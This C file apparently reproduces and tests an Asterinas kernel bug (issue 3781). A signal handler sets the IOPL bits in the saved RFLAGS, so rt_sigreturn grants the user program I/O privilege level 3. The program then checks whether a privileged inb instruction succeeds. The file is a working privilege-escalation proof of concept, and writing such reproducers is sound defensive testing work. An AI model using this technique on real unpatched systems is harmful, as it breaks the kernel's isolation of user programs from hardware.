// SPDX-License-Identifier: MPL-2.0

// Userspace reproduction of asterinas#3781 (x86): `sys_rt_sigreturn` restored the RFLAGS saved
// in the user signal frame verbatim, without masking the privileged IOPL field. A user program
// can therefore raise its own I/O privilege level to 3 and execute privileged I/O instructions.
//
// Trigger (no special syscall, the ordinary signal path):
//   1. install a SA_SIGINFO handler and raise a signal;
//   2. inside the handler, set the IOPL field (bits 12-13) in the saved RFLAGS of the signal
//      frame (`uc_mcontext.gregs[REG_EFL]`);
//   3. return from the handler, which invokes rt_sigreturn and restores that RFLAGS to CPU.
//
// Observation (pure userspace):
//   - read RFLAGS with `pushfq` after the handler returns; a correct kernel keeps IOPL at 0
//     (it only restores the user-modifiable flag bits), the buggy kernel leaves IOPL at 3;
//   - as a concrete consequence, execute the privileged `inb` instruction: at IOPL=3 it runs,
//     at IOPL=0 it faults with #GP (delivered as SIGSEGV), which we catch.

#define _GNU_SOURCE
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <ucontext.h>

static volatile int handler_ran;
static sigjmp_buf jb;

// SIGUSR1 handler: force IOPL=3 into the RFLAGS word the kernel will restore on sigreturn.
static void bump_iopl(int sig, siginfo_t *si, void *uctx)
{
	ucontext_t *uc = (ucontext_t *)uctx;
	uc->uc_mcontext.gregs[REG_EFL] |= (3UL << 12);
	handler_ran = 1;
}

// SIGSEGV handler: a privileged instruction at IOPL=0 faults; recover instead of dying.
static void catch_segv(int sig)
{
	siglongjmp(jb, 1);
}

static inline uint64_t read_rflags(void)
{
	uint64_t f;
	__asm__ volatile("pushfq\n\tpop %0" : "=r"(f));
	return f;
}

int main(void)
{
	struct sigaction sa;

	memset(&sa, 0, sizeof(sa));
	sa.sa_sigaction = bump_iopl;
	sa.sa_flags = SA_SIGINFO;
	sigaction(SIGUSR1, &sa, NULL);

	unsigned iopl_before = (unsigned)((read_rflags() >> 12) & 3);
	raise(SIGUSR1);
	unsigned iopl_after = (unsigned)((read_rflags() >> 12) & 3);

	printf("KMIRI_3781 handler_ran=%d iopl_before=%u iopl_after=%u\n", handler_ran,
	       iopl_before, iopl_after);

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = catch_segv;
	sigaction(SIGSEGV, &sa, NULL);
	if (sigsetjmp(jb, 1) == 0) {
		uint8_t v;
		// Privileged I/O read from the POST diagnostic port (0x80), harmless to read.
		__asm__ volatile("inb $0x80, %0" : "=a"(v));
		printf("KMIRI_3781 privileged_inb=OK value=0x%02x\n", (unsigned)v);
	} else {
		printf("KMIRI_3781 privileged_inb=DENIED_SIGSEGV\n");
	}

	if (iopl_after == 3)
		printf("KMIRI_3781 VERDICT=IOPL_LEAKED_TO_USER\n");
	else
		printf("KMIRI_3781 VERDICT=IOPL_CLEARED\n");
	return 0;
}
